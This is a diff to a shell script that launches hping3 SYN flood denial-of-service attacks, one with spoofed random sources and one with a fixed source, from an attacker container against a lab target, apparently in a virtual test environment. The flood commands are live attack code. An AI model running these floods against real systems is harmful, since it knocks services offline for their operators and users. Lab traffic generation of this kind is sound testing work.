@@ -3,7 +3,7 @@
 set -e
 
 # ./dos_syn_flood_hping3.sh clab-virtual-env-attacker
-# ./dos_syn_flood_hping3.sh clab-virtual-env-attacker 172.16.30.2 80 120
+# ./dos_syn_flood_hping3.sh clab-virtual-env-attacker 172.16.30.2 80 60
 
 # If called with -n, return the menu name
 if [ "$1" = "-n" ]; then
@@ -36,21 +36,22 @@ echo "================================"
 # --tcp-timestamp -> Set timestamp on packages
 # -V              -> Verbose
 
-# docker exec "$ATTACKER_CONTAINER" timeout "$TIMEOUT" hping3 -S -p "$PORT" --flood --rand-source --tcp-timestamp "$TARGET"
-
-# Recommended to kill the process using it's PID and not through a timeout (one reason to avoid exiting the main script)
-echo "-----Random Source-----"
+# Recommended to kill the process using its PID and not through a timeout,
+# so the parent shell stays alive to reap the child and avoid zombie processes
+echo "--- Random Source ---"
 docker exec "$ATTACKER_CONTAINER" sh -c "
   hping3 -S -p $PORT --flood --rand-source --tcp-timestamp $TARGET &
   HPING_RND_PID=\$!
   sleep $TIMEOUT
   kill -2 \$HPING_RND_PID
+  wait \$HPING_RND_PID 2>/dev/null || true
 "
 
-echo "-----Same Source-----"
+echo "--- Same Source ---"
 docker exec "$ATTACKER_CONTAINER" sh -c "
   hping3 -S -p $PORT --flood --tcp-timestamp $TARGET &
   HPING_STC_PID=\$!
   sleep $TIMEOUT
   kill -2 \$HPING_STC_PID
+  wait \$HPING_STC_PID 2>/dev/null || true
 "
